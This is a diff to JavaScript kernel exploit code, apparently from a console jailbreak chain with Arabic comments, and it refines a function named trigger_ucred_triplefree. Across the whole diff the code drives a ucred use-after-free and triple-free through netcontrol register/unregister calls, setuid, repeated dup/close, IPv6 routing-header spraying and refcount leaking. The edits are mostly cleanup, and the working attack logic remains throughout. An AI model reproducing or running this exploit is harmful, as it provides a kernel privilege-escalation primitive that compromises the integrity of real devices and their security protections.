@@ -1299,50 +1299,41 @@ var TRIPLEFREE_REFCOUNT_FIX_LOOPS = 8;
 var TRIPLEFREE_REFCOUNT_MAX_WAIT = 500;
 
 function trigger_ucred_triplefree() {
+
   var end = false;
-  var uaf_socket = -1
+  var uaf_socket = -1;
 
   // msgIov كما في الأصلي
   write64(msgIov.add(0x0), 1);
   write64(msgIov.add(0x8), 1);
+
   var main_count = 0;
+
   while (!end && main_count < TRIPLEFREE_ITERATIONS) {
+
     main_count++;
 
     // 1) dummy socket → register in netcontrol
     var dummy_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    //send_notification("[STEP 1] create dummy socket: dummy_socket=" + dummy_socket);
 
     var sock_buf = malloc(8);
     write32(sock_buf, dummy_socket);
-    //send_notification("[STEP 1] alloc sock_buf + write fd: sock_buf=" + sock_buf + " fd=" + dummy_socket);
-
-    //send_notification("[STEP 1] netcontrol register: cmd=" + hex(0x20000003) + " buf=" + sock_buf);
     netcontrol(-1, 0x20000003, sock_buf, 8);
-
-    //send_notification("[STEP 1] close dummy_socket: fd=" + dummy_socket);
     close(new BigInt(dummy_socket));
-
 
     // 2) allocate new ucred
     setuid(1);
 
-
     // 3) reclaim fd → uaf_socket
     uaf_socket = socket(AF_UNIX, SOCK_STREAM, 0);
-    //send_notification("[STEP 3] reclaim fd as uaf_socket: uaf_socket=" + uaf_socket);
-
 
     // 4) free previous ucred
     setuid(1);
 
-
     // 5) unregister → free file + ucred
-    ctrl_buf = malloc(8);
+    var ctrl_buf = malloc(8);
     write32(ctrl_buf, uaf_socket);
-    //send_notification("[STEP 5] unregister netcontrol: ctrl_buf=" + ctrl_buf + " fd=" + uaf_socket);
     netcontrol(-1, 0x20000007, ctrl_buf, 8);
-
 
     // 6) محاولة إصلاح refcount بشكل خفيف
     for (var i = 0; i < TRIPLEFREE_REFCOUNT_FIX_LOOPS; i++) {
@@ -1352,11 +1343,8 @@ function trigger_ucred_triplefree() {
       read(new BigInt(iov_sock_0), tmp, 1);
     }
 
-
     // 7) double free أول مرة
-    //send_notification("[STEP 7] first double-close: fd=" + uaf_socket);
     close(dup(new BigInt(uaf_socket)));
-
 
     // 8) إيجاد التوأم
     end = find_twins();
@@ -1370,105 +1358,73 @@ function trigger_ucred_triplefree() {
       continue;
     }
 
-
     // 9) free واحدة من التوأم
     send_notification("[STEP 9] freeing twin index=" + twins[1] +
                       " fd=" + ipv6_socks[twins[1]]);
     free_rthdr(ipv6_socks[twins[1]]);
 
-
     // 10) انتظار refcount = 1
     send_notification("[STEP 10] monitoring refcount on twin=" + twins[0]);
 
-    // ======================================================
-    // STEP 10 — مراقبة refcount (Success Gate داخل اللوب)
-    // ======================================================
-
-    count = 0;
+    var count = 0;
 
     while (count < TRIPLEFREE_REFCOUNT_MAX_WAIT) {
 
-      // تشغيل الدورة
       trigger_iov_recvmsg();
-
       write(new BigInt(iov_sock_1), tmp, 1);
       wait_iov_recvmsg();
       read(new BigInt(iov_sock_0), tmp, 1);
 
-      // قراءة refcount
       write32(leak_rthdr.add(0x04), 0);
       get_rthdr(ipv6_socks[twins[0]], leak_rthdr, 8);
 
       var ref = read32(leak_rthdr);
 
-      // Success Gate: لو ref <= 0 → نجاح مبكر
       if (ref <= 0) {
         send_notification("[STEP 10] refcount success condition met");
-        return true;   // ← خروج مبكر بنجاح
+        return true;
       }
 
       count++;
     }
 
-    // لو الوقت خلص بدون refcount success
     send_notification("[STEP 10] max wait reached, continuing anyway");
 
-
-    // ======================================================
-    // STEP 11 — triple-close
-    // ======================================================
-
+    // 11) triple-close
     close(dup(new BigInt(uaf_socket)));
     send_notification("[STEP 11] triple-close on fd=" + uaf_socket);
 
-
-    // ======================================================
-    // STEP 12 — محاولة إيجاد triplet1
-    // ======================================================
-
+    // 12) محاولة إيجاد triplet1
     triplets[1] = find_triplet(triplets[0], -1);
 
-    // Success Gate: طالما مش -1 → نجاح منطقي
     if (triplets[1] === -1) {
       send_notification("[STEP 12] triplet1 not found, continuing anyway");
     } else {
       send_notification("[STEP 12] triplet1 found=" + triplets[1]);
-      // نجاح منطقي → الفلو يكمل طبيعي
     }
 
-    // استمرار الفلو
     write(new BigInt(iov_sock_1), tmp, 1);
 
-
-    // ======================================================
-    // STEP 13 — محاولة إيجاد triplet2
-    // ======================================================
-
+    // 13) محاولة إيجاد triplet2
     triplets[2] = find_triplet(triplets[0], triplets[1]);
 
-    // Success Gate: طالما مش -1 → نجاح منطقي
     if (triplets[2] === -1) {
       send_notification("[STEP 13] triplet2 not found, continuing anyway");
     } else {
       send_notification("[STEP 13] triplet2 found=" + triplets[2]);
-      // نجاح منطقي → الفلو يكمل طبيعي
     }
 
-    // استمرار الفلو
     wait_iov_recvmsg();
     read(new BigInt(iov_sock_0), tmp, 1);
 
+  } // نهاية while
 
-    // ======================================================
-    // نهاية اللوب الكبيرة
-    // ======================================================
+  // لو خرجنا من اللوب بسبب استنفاد المحاولات
+  if (main_count === TRIPLEFREE_ITERATIONS) {
+    return false;
+  }
 
-    if (main_count === TRIPLEFREE_ITERATIONS) {
-      return false;   // فشل بعد استنفاد المحاولات
-    }
-
-  return true;        // نجاح الفلو
-
+  return true;
 }
 function leak_kqueue() {
   debug('Leaking kqueue...');
